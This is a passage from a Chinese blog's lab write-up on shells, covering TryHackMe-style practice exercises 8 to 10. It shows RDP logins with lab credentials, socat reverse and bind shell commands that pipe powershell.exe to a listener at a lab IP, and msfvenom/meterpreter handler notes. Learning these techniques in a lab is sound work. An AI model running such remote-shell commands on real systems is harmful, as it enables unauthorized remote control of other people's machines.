<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174211582.png" alt="image-20240324174211582"></p>
<pre><code class="hljs scss">xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<span class="hljs-number">10.10</span>.<span class="hljs-number">90.86</span> /u:hybcx /p:<span class="hljs-string">'1234'</span>    #添加剪切板功能</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174435663.png" alt="image-20240324174435663"></p>
<h3 id="练习8">练习8</h3>
<p><strong>netcat反向shell</strong></p>
<pre><code class="hljs scss">xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<span class="hljs-number">10.10</span>.<span class="hljs-number">90.86</span> /u:Administrator /p:<span class="hljs-string">'TryH4ckM3!'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174910205.png" alt="image-20240324174910205"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174901070.png" alt="image-20240324174901070"></p>
<p><strong>netcat绑定shell</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175029199.png" alt="image-20240324175029199"></p>
<p><strong>socat反向shell</strong></p>
<pre><code class="hljs scss">socat TCP-L:<span class="hljs-number">5555</span> -
socat TCP:<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>:<span class="hljs-number">5555</span> EXEC:powershell.exe,pipes</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175225124.png" alt="image-20240324175225124"></p>
<p><strong>socat绑定shell</strong></p>
<pre><code class="hljs scss">socat TCP-L:<span class="hljs-number">5555</span> EXEC:powershell.exe,pipes
socat TCP:<span class="hljs-number">10.11</span>.<span class="hljs-number">65.203</span>:<span class="hljs-number">5555</span> -</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175446521.png" alt="image-20240324175446521"></p>
<h3 id="练习9">练习9</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180823212.png" alt="image-20240324180823212"></p>
<p>使用msfvenom生成exe之后直接复制到目标机上即可，接下来进入meterpreter的监听模块</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180831608.png" alt="image-20240324180831608"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180840222.png" alt="image-20240324180840222"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180849107.png" alt="image-20240324180849107"></p>
<h3 id="练习10">练习10</h3>
<p>使用练习9遗留的分段exe，发现弹回来的shell无法使用，不能回显信息，接下来尝试不分段的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324181134375.png" alt="image-20240324181134375"></p>
<p>如下图，依旧没反应</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324181429758.png" alt="image-20240324181429758"></p>
<p>结果：不能，我们需要使用msf里面的multi/handler模块捕获meterpreter shell，用netcat并不能使这个shell正常工作。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/03/24/shell-xue-xi/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/03/24/shell-xue-xi/')">shell学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/03/24/shell-xue-xi/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=shell学习&amp;url=http://hybcx.xyz/2024/03/24/shell-xue-xi/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Metasploit/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Metasploit<span class="tagsPageCount">3</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/24/metasploit-xue-xi-2/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Metasploit学习2</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/26/gdouctf-2023/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">GDOUCTF2023</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/03/23/metasploit-xue-xi/" title="Metasploit学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-23</div><div class="title">Metasploit学习</div></div></a></div><div><a href="/2024/03/24/metasploit-xue-xi-2/" title="Metasploit学习2"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-24</div><div class="title">Metasploit学习2</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFshell"><span class="toc-number">1.</span> <span class="toc-text">0x01 什么是shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">0x02 工具介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat"><span class="toc-number">2.1.</span> <span class="toc-text">Netcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socat"><span class="toc-number">2.2.</span> <span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit-multihandler"><span class="toc-number">2.3.</span> <span class="toc-text">Metasploit – multi&#x2F;handler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom"><span class="toc-number">2.4.</span> <span class="toc-text">Msfvenom</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-shell%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.</span> <span class="toc-text">0x03 shell类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-shells%E5%8F%8D%E5%90%91shell"><span class="toc-number">3.1.</span> <span class="toc-text">Reverse shells（反向shell）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bind-shells%E7%BB%91%E5%AE%9Ashell"><span class="toc-number">3.2.</span> <span class="toc-text">Bind shells（绑定shell）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-netcat"><span class="toc-number">4.</span> <span class="toc-text">0x04 Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell"><span class="toc-number">4.1.</span> <span class="toc-text">Netcat建立反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%BB%BA%E7%AB%8B%E7%BB%91%E5%AE%9Ashell"><span class="toc-number">4.2.</span> <span class="toc-text">Netcat建立绑定shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-shell%E7%9A%84%E7%A8%B3%E5%AE%9A%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">0x05 shell的稳定化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A71-python"><span class="toc-number">5.1.</span> <span class="toc-text">技巧1: Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A72-rlwrap"><span class="toc-number">5.2.</span> <span class="toc-text">技巧2: rlwrap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A73-socat"><span class="toc-number">5.3.</span> <span class="toc-text">技巧3: Socat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-socat"><span class="toc-number">6.</span> <span class="toc-text">0x06 Socat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-shells%E5%8F%8D%E5%90%91shell"><span class="toc-number">6.1.</span> <span class="toc-text">Reverse Shells（反向shell）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bind-shells%E7%BB%91%E5%AE%9Ashell"><span class="toc-number">6.2.</span> <span class="toc-text">Bind Shells（绑定shell）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-socat%E5%8A%A0%E5%AF%86shell"><span class="toc-number">7.</span> <span class="toc-text">0x07 Socat加密shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%90%91shell"><span class="toc-number">7.1.</span> <span class="toc-text">加密反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%BB%91%E5%AE%9Ashell"><span class="toc-number">7.2.</span> <span class="toc-text">加密绑定shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%B8%B8%E7%94%A8shell-payload"><span class="toc-number">8.</span> <span class="toc-text">0x08 常用shell payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-msfvenom%E7%94%9F%E6%88%90shell-payload"><span class="toc-number">9.</span> <span class="toc-text">0x09 Msfvenom生成shell payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-metasploit-multihandler%E6%A8%A1%E5%9D%97"><span class="toc-number">10.</span> <span class="toc-text">0x10 Metasploit multi&#x2F;handler模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-webshell%E4%BB%8B%E7%BB%8D"><span class="toc-number">11.</span> <span class="toc-text">0x11 webshell介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x12-%E8%8E%B7%E5%8F%96shell%E4%B9%8B%E5%90%8E%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">12.</span> <span class="toc-text">0x12 获取shell之后的操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x13-%E7%BB%83%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5"><span class="toc-number">13.</span> <span class="toc-text">0x13 练习与实践</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-practice-box"><span class="toc-number">13.1.</span> <span class="toc-text">Linux Practice Box</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A01"><span class="toc-number">13.1.1.</span> <span class="toc-text">练习1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A02"><span class="toc-number">13.1.2.</span> <span class="toc-text">练习2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A03"><span class="toc-number">13.1.3.</span> <span class="toc-text">练习3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A04"><span class="toc-number">13.1.4.</span> <span class="toc-text">练习4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A05"><span class="toc-number">13.1.5.</span> <span class="toc-text">练习5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A06"><span class="toc-number">13.1.6.</span> <span class="toc-text">练习6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A07"><span class="toc-number">13.1.7.</span> <span class="toc-text">练习7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A08"><span class="toc-number">13.1.8.</span> <span class="toc-text">练习8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A09"><span class="toc-number">13.1.9.</span> <span class="toc-text">练习9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A010"><span class="toc-number">13.1.10.</span> <span class="toc-text">练习10</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont 